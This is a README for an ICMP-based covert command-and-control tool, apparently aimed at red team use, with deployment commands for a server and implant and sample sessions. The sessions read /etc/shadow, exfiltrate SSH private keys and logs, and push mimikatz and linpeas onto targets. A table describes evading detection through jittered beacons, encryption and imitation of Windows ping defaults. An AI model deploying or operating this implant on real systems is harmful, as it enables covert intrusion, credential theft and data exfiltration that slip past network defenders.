# ICMP C2 v2

Covert command & control over ICMP Echo — protocol abuse for red team operations.

```
Server (attacker)                      Agent (target)
┌──────────┐                           ┌──────────┐
│          │── ICMP Echo (command) ───▶│          │
│  C2      │◀── ICMP Echo (output) ───│  implant │
│          │◀── ICMP Echo (heartbeat)──│          │
│          │◀── ICMP Echo (files) ────│          │
└──────────┘                           └──────────┘
```

Binary framing. Thread-safe. Jittered heartbeats. File transfer. Fernet encryption.

---

## Files

| File | Purpose | Lines |
|------|---------|:-----:|
| `icmp_protocol.py` | Shared library — framing, codec, sessions, chunk assembly | ~380 |
| `icmp_server_v2.py` | C2 server — sniffs, commands, interactive shell | ~380 |
| `icmp_agent_v2.py` | Implant — heartbeats, executes commands, file transfer | ~420 |

Drop all three in the same directory. Server and agent import from `icmp_protocol`.

---

## Install

```bash
pip install scapy cryptography
```

**root / Administrator required** — raw sockets.

---

## Quick Start (5 commands)

```bash
# 1. Generate a shared key
python -c "from icmp_protocol import Codec; print(Codec.generate_key())"

# 2. Start the server (attacker machine)
python icmp_server_v2.py -i eth0 --encrypt --key 'PASTE_KEY_HERE'

# 3. Deploy the agent (target machine)
python icmp_agent_v2.py -i eth0 -s 192.168.1.100 --encrypt --key 'SAME_KEY'

# 4. Agent heartbeat appears on server:
#    ♥ 10.0.0.5 (target-pc) [d5050085]

# 5. Run commands
c2 [target-pc]> whoami
c2 [target-pc]> sysinfo
```

---

## Examples

### Example 1 — Basic plaintext

No encryption, no compression. Fastest, most compatible. Use when stealth isn't critical.

**Server:**
```bash
python icmp_server_v2.py -i eth0
```

**Agent:**
```bash
python icmp_agent_v2.py -i eth0 -s 192.168.1.100
```

**Session:**
```
  ╔══════════════════════════════════════════════╗
  ║    ICMP C2 SERVER v2 — Professional Edition    ║
  ╚══════════════════════════════════════════════╝
  Interface:  eth0
  ICMP ID:    13170 (0x3372)
  Encryption: OFF
  Encoding:   plain
  Compression: OFF

  Waiting for agents... (Ctrl+C to stop)

[*] ♥ 10.0.0.5 (target-pc) [d5050085759e]
c2 [target-pc]> whoami
root
c2 [target-pc]> uname -a
Linux target-pc 6.1.0 x86_64 GNU/Linux
c2 [target-pc]> id
uid=0(root) gid=0(root) groups=0(root)
c2 [target-pc]> ps
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.1 169500 12456 ?        Ss   10:23   0:02 /sbin/init
root         423  0.0  0.3  28544 32100 ?        Ss   10:24   0:01 /usr/bin/python3
...
c2 [target-pc]> uptime
 10:35:42 up  0:12,  1 user,  load average: 0.15, 0.10, 0.05
```

### Example 2 — Full stealth (encrypt + compress + base64)

Every payload is Fernet-encrypted, zlib-compressed, then base64-encoded. Wire content looks like random base64. Heavier CPU but payloads are indistinguishable from noise.

**Server:**
```bash
python icmp_server_v2.py -i eth0 \
    --encrypt --key 'gVkYp3s2v9yB$E(H+MbQeThWmZq4t7w!' \
    --compress --encoding base64
```

**Agent:**
```bash
python icmp_agent_v2.py -i eth0 -s 192.168.1.100 \
    --encrypt --key 'gVkYp3s2v9yB$E(H+MbQeThWmZq4t7w!' \
    --compress --encoding base64
```

**Session:**
```
  Encryption: ON       Compression: ON       Encoding: base64
  Chunk size: 1400B

c2 [target-pc]> cat /etc/shadow
root:$6$xyz...:19000:0:99999:7:::
daemon:*:19000:0:99999:7:::

c2 [target-pc]> ls /home
total 16
drwxr-xr-x  4 root  root  4096 Jul 15 10:23 .
drwxr-xr-x 18 root  root  4096 Jul 15 10:23 ..
drwx------  2 alice alice 4096 Jul 15 10:24 alice
drwx------  2 bob   bob   4096 Jul 15 10:25 bob
```

### Example 3 — File upload (server → agent)

Deliver a payload or tool to the target.

**Server:**
```bash
python icmp_server_v2.py -i eth0 --chunk-size 1200
```

**Session:**
```
c2 [target-pc]> upload linpeas.sh
[*] Sending linpeas.sh (847,231 bytes) to 10.0.0.5
[*]   Sent 50/706 chunks (7%)
[*]   Sent 100/706 chunks (14%)
[*]   Sent 150/706 chunks (21%)
...
[+] File linpeas.sh sent (706 chunks)

c2 [target-pc]> upload mimikatz.exe
[*] Sending mimikatz.exe (1,305,672 bytes) to 10.0.0.5
[+] File mimikatz.exe sent (1088 chunks)

# Agent side receives it:
c2 [target-pc]> ls incoming
linpeas.sh         847,231
mimikatz.exe     1,305,672

c2 [target-pc]> chmod +x linpeas.sh && ./linpeas.sh
```

### Example 4 — File download (agent → server)

Exfiltrate loot from the target.

**Session:**
```
c2 [target-pc]> download /etc/passwd
[*] Uploading /etc/passwd to server...

c2 [target-pc]> download /home/alice/.ssh/id_rsa
[*] Uploading /home/alice/.ssh/id_rsa to server...

c2 [target-pc]> download /var/log/auth.log
[*] Uploading /var/log/auth.log to server...

# Files appear in server's ./downloads/ directory:
$ ls downloads/
passwd         2,451
id_rsa         2,611
auth.log     142,873
```

### Example 5 — Multi-agent (beaconing mode)

Multiple targets beaconing to one server. Use `sessions` to see them all, `target` to pick one.

**Server:**
```bash
python icmp_server_v2.py -i eth0 --quiet
```

**Session:**
```
  Waiting for agents...

[*] ♥ 10.0.0.5 (web-server) [d5050085]
[*] ♥ 10.0.0.12 (db-server) [a1b2c3d4]
[*] ♥ 10.0.0.23 (workstation) [e5f6a7b8]

c2 [3 agents]> sessions

  IP               Hostname         User         OS           Uptime     Session ID
  ──────────────── ──────────────── ──────────── ──────────── ────────── ────────────
  10.0.0.5         web-server       root         Linux 6.1    245s       d5050085759e
  10.0.0.12        db-server        postgres     Linux 6.1    180s       a1b2c3d4e5f6
  10.0.0.23        workstation      alice        Windows 11   92s        e5f6a7b8c9d0

c2 [3 agents]> target
  Select agent #: 3
[+] Target set to workstation (10.0.0.23)

c2 [workstation]> whoami
desktop-alice\alice

c2 [workstation]> tasklist
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0      1,432 K
explorer.exe                  4231 Console                    2    142,880 K
chrome.exe                    8912 Console                    2    847,216 K

c2 [workstation]> target
  Select agent #: 1
[+] Target set to web-server (10.0.0.5)

c2 [web-server]> netstat -tlnp
tcp  0  0 0.0.0.0:80    0.0.0.0:*  LISTEN  1234/nginx
tcp  0  0 0.0.0.0:443   0.0.0.0:*  LISTEN  1234/nginx
tcp  0  0 0.0.0.0:22    0.0.0.0:*  LISTEN  892/sshd
tcp  0  0 0.0.0.0:3306  0.0.0.0:*  LISTEN  1024/mysqld
```

### Example 6 — Stealth mode with custom ICMP ID

Rotate the ICMP ID to blend with different network environments. Use `--quiet` to suppress all output except command results.

**Server:**
```bash
python icmp_server_v2.py -i eth0 --icmp-id 0 --quiet --ttl 128
```

**Agent:**
```bash
python icmp_agent_v2.py -i eth0 -s 192.168.1.100 --icmp-id 0 --ttl 128 --quiet
```

ICMP ID `0` and TTL `128` are Windows `ping.exe` defaults — traffic blends into normal network noise.

**Session (server side — no heartbeat spam):**
```
whoami
root
ps aux | grep sshd
root  892  0.0  0.1  12136  7124 ?  Ss  10:23  0:00 /usr/sbin/sshd
```

### Example 7 — Check available interfaces on target

Before deploying, check which interfaces the agent can use:

```bash
python icmp_agent_v2.py --show-interfaces
```

```
  Available Network Interfaces:
  ========================================
   1. eth0
   2. wlan0
   3. lo
   4. tun0
  ========================================
```

Then pick one:
```bash
python icmp_agent_v2.py -i tun0 -s 10.8.0.1 --encrypt --key '...'
```

---

## CLI Reference

### Server

```
python icmp_server_v2.py -i <IFACE> [OPTIONS]

  -i, --interface    Network interface (required)
  --icmp-id N        ICMP ID, 0–65535 (default: 13170)
  --ttl N            IP TTL, 1–255 (default: 64)
  --chunk-size N     Max bytes per ICMP packet (default: 1400, max: 1400)
  --encoding         plain | base64 | hex (default: plain)
  --compress         Enable zlib compression
  --encrypt          Enable Fernet encryption (requires --key)
  --key KEY          32-byte base64 Fernet key
  -q, --quiet        Suppress heartbeat and info messages
```

### Agent

```
python icmp_agent_v2.py -i <IFACE> -s <SERVER_IP> [OPTIONS]

  -i, --interface    Network interface (required)
  -s, --server       C2 server IP address (required)
  --icmp-id N        ICMP ID (must match server)
  --ttl N            IP TTL
  --chunk-size N     Max bytes per ICMP packet
  --encoding         plain | base64 | hex
  --compress         Enable zlib compression
  --encrypt          Enable Fernet encryption (requires --key)
  --key KEY          Fernet key (must match server)
  -q, --quiet        Suppress info messages
  --show-interfaces  List interfaces and exit
```

### Built-in Agent Commands

| Command | Description | Example |
|---------|-------------|---------|
| `sysinfo` | OS, hostname, user, Python version, CWD | `sysinfo` |
| `ps` | Process list | `ps` |
| `ls <path>` | Directory listing | `ls /etc` |
| `cat <file>` | Read file (≤ 100 MB) | `cat /etc/shadow` |
| `upload <file>` | Server → agent file transfer | `upload beacon.exe` |
| `download <file>` | Agent → server file transfer | `download /var/log/auth.log` |
| `exit` | Kill the agent | `exit` |
| `sessions` | List connected agents | `sessions` |
| `target` | Select agent to command | `target` |
| `help` | Show command list | `help` |
| *anything else* | Shell command | `netstat -tlnp` |

---

## Protocol

### Binary Frame (every packet)

```
 0      2      3      5      7      9         9+N
┌──────┬──────┬──────┬──────┬──────┬──────┐.......┐
│0xCC33│ Type │ Index│ Total│Length│        Payload │
│ 2B   │  1B  │  2B  │  2B  │  2B  │        N bytes │
└──────┴──────┴──────┴──────┴──────┴──────┘.......┘

Type values:
  0x01  HEARTBEAT    Agent → Server, periodic, carries "host|user|os"
  0x02  COMMAND      Server → Agent, shell command or built-in
  0x03  RESPONSE     Agent → Server, command output
  0x04  FILE_START   Bidirectional, announces filename|size
  0x05  FILE_CHUNK   Bidirectional, raw file data chunk
  0x06  FILE_END     Bidirectional, transfer complete
  0x07  ACK          Bidirectional, acknowledgment
  0x08  ERROR        Agent → Server, error details
```

### Encoding Pipeline

```
                      SEND                              RECEIVE
              ┌──────────────────┐              ┌──────────────────┐
  raw bytes ──┤ [1] compress?    ├──┐    ┌──────┤ [4] decompress?  ├── raw bytes
              └──────────────────┘  │    │      └──────────────────┘
              ┌──────────────────┐  │    │      ┌──────────────────┐
              └─┤ [2] base64|hex ├──┤    ├──────┤ [3] base64|hex ├─┘
                └──────────────────┘  │    │      └──────────────────┘
                ┌──────────────────┐  │    │      ┌──────────────────┐
                └─┤ [3] Fernet     ├──┤    ├──────┤ [2] Fernet     ├─┘
                  └──────────────────┘  │    │      └──────────────────┘
                  ┌──────────────────┐  │    │      ┌──────────────────┐
                  └─┤ [4] base64     ├──┘    └──────┤ [1] base64     ├─┘
                    └──────────────────┘              └──────────────────┘
                            │                              ▲
                            ▼                              │
                       ICMP payload                  ICMP payload
```

Every Fernet ciphertext gets base64-encoded for transport. The old code used `.decode('latin-1')` which silently corrupted bytes — this is fixed.

### Chunking & Reassembly

Payloads larger than `chunk_size` are split automatically. Each chunk carries its index and total count in the 9-byte binary header. The `ChunkAssembler` on the receive side buffers chunks and reassembles when the last one arrives. Stale buffers expire after 30 seconds.

```
[0/3:Hello ] [1/3:ICMP ] [2/3:World!]   →   "Hello ICMP World!"
```

Out-of-order delivery is handled correctly — chunks can arrive in any order.

---

## Key Features

### Jittered Heartbeats

Heartbeats fire every **45–75 seconds** (60s base ± 15s random jitter). Fixed-interval beacons are trivially signature-detectable — jitter breaks the pattern. Adjust `HEARTBEAT_INTERVAL` and `HEARTBEAT_JITTER` in `icmp_protocol.py` to tune.

### Session Tracking

The server tracks each agent by IP, recording hostname, user, OS, connection time, and heartbeat count. Dead agents (no heartbeat for 90s) are automatically pruned. `sessions` command shows the live list:

```
  IP               Hostname         User         OS           Uptime     Session ID
  ──────────────── ──────────────── ──────────── ──────────── ────────── ────────────
  10.0.0.5         web-server       root         Linux 6.1    325s       d5050085759e
```

### File Transfer

Files up to 100 MB stream over ICMP in chunks with progress reporting. Auto-reassembled on the receiving end. Server → agent files land in `./incoming/`. Agent → server files land in `./downloads/`.

### Thread Safety

All shared state is behind `threading.Lock` — session registry, chunk buffers, file transfer state, and output. The Scapy sniffer runs in a background thread; commands come from the main thread. No race conditions.

### Error Handling

Agent errors are sent back to the server as `MsgType.ERROR` frames with the full exception message. The server surfaces the error and continues. Commands time out after 30 seconds on the agent side to prevent stale processes.

---

## Detection Considerations

| What it looks like | Risk | Mitigation |
|---|---|---|
| ICMP Echo with payload | IDS may flag non-empty payloads | Fernet encryption → payload is random bytes, indistinguishable from benign ping data patterns |
| Regular ICMP bursts | Pattern analysis | Jittered timing, configurable chunk delays |
| Unusual ICMP ID | Easy signature | Configurable — use `0` (Windows ping default) or random per-op |
| High ICMP volume | Bandwidth anomaly | Smaller chunk sizes, longer inter-packet delays, rate limiting |
| Bidirectional type 8 | Unusual (replies should be type 0) | Both sides use type 8 — looks like two hosts pinging each other |

---

## Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| `PermissionError` on sniff | Not root/Admin | `sudo` on Linux, run as Administrator on Windows |
| No agents appear | ICMP blocked by firewall | Try different ICMP ID, use `--icmp-id 0`, check firewall rules |
| `[DECRYPTION ERROR]` | Key mismatch | Regenerate key, use same on both sides |
| Chunks never reassemble | Network drops packets | Increase `CHUNK_TIMEOUT` in `icmp_protocol.py` |
| Agent not receiving commands | Wrong interface | Run `--show-interfaces` on target, use correct one |
| `ModuleNotFoundError: scapy` | Missing dependency | `pip install scapy cryptography` |
| Commands timeout | Long-running command | Shell commands timeout at 30s by default |
| File transfer stalls | Chunk size too large for path MTU | Reduce `--chunk-size` (e.g. 500) |

---

## Requirements

- Python 3.7+
- `scapy` — packet crafting & sniffing
- `cryptography` — Fernet encryption (optional, needed only if `--encrypt`)
- Root / Administrator — raw socket access

```bash
pip install scapy cryptography
```
